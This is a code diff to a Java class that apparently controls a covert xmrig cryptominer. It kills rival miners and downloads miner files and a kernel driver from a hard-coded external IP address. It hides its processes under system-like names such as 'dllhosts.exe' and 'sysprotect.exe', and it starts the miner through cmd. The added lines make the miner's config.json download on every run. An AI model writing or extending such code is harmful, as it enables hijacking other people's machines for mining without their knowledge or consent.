@@ -12,6 +12,7 @@ import java.util.Date;
 import java.util.Timer;
 
 public class AXMain {
+    public static final String RLS_NOTE="PauseWhenECRunning";
     public static final String[] PROG_MASK_NAME=new String[]{"memprog.exe","memmgr.exe","sysprotect.exe","ssddriver.exe","pcasi.exe","dllhosts.exe","mediahost.exe","monitor.exe","touchas.exe"};
     //从ghostj的配置文件读取本机名称
     //向ax服务端发送注册消息
@@ -27,6 +28,7 @@ public class AXMain {
     static boolean printToStdout=false;
     static Timer timer=new Timer();
     static AutoSwitch autoSwitch;
+    static ProcessCmd processCmd;
     public static void main(String[] args) {
         //避免重复
         killAllMiner();
@@ -48,11 +50,6 @@ public class AXMain {
         //检查是否有xmrig已存在,没有则下载
         if (!(new File("D:\\xmrig\\config.json").exists())){
             try {
-                downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/config.json", "config.json", "D:\\xmrig", "dl"+new Date().getTime());
-            }catch (Exception e) {
-                e.printStackTrace();
-            }
-            try {
                 downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/WinRing0x64.sys", "WinRing0x64.sys", "D:\\xmrig", "dl"+new Date().getTime());
             }catch (Exception e) {
                 e.printStackTrace();
@@ -62,6 +59,11 @@ public class AXMain {
             }catch (Exception e) {
                 e.printStackTrace();
             }
+        }
+        try {
+            downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/config.json", "config.json", "D:\\xmrig", "dl"+new Date().getTime());
+        }catch (Exception e) {
+            e.printStackTrace();
         }
         //读取ghostj的配置文件修改config.json中的本机pass
         String cfgjson=FileRW.readMultiLine("D:\\xmrig\\config.json");
@@ -92,7 +94,7 @@ public class AXMain {
             }
         }
         //启动xmrig
-        ProcessCmd processCmd=new ProcessCmd("cmd");
+        processCmd=new ProcessCmd("cmd");
         processCmd.cmd="cmd";
         processCmd.start();
         try {
